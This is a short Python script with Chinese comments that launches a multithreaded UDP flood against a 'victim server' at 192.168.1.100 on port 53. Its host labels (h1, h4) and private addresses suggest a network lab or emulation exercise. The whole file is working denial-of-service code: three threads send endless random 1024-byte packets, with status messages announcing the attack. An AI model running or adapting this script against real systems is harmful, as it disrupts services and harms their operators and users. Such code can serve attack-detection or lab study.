import socket
import random
import threading

# 目标主机：h1（受害者服务器）
TARGET_IP = "192.168.1.100"
TARGET_PORT = 53  # 选择常用端口（如DNS端口53）
THREAD_COUNT = 3  # 攻击线程数量
PACKET_SIZE = 1024  # 每个UDP包的大小（字节）

def udp_flood():
    """UDP Flood攻击函数"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # 使用h4的真实IP地址 (192.168.1.103)
    src_ip = "192.168.1.103"
    
    while True:
        # 生成随机数据
        data = random._urandom(PACKET_SIZE)
        
        # 发送UDP包
        sock.sendto(data, (TARGET_IP, TARGET_PORT))
        
        # 每发送1000个包打印一次状态
        if random.randint(1, 1000) == 500:
            print(f"📊 已发送大量UDP包：{src_ip} → {TARGET_IP}:{TARGET_PORT}")

if __name__ == "__main__":
    print(f"🚀 开始UDP Flood攻击，目标：{TARGET_IP}:{TARGET_PORT}")
    print(f"ℹ️  按Ctrl+C停止攻击")
    
    # 启动多线程攻击
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_flood)
        thread.daemon = True
        thread.start()
    
    # 保持主线程运行
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n🛑 攻击已停止")

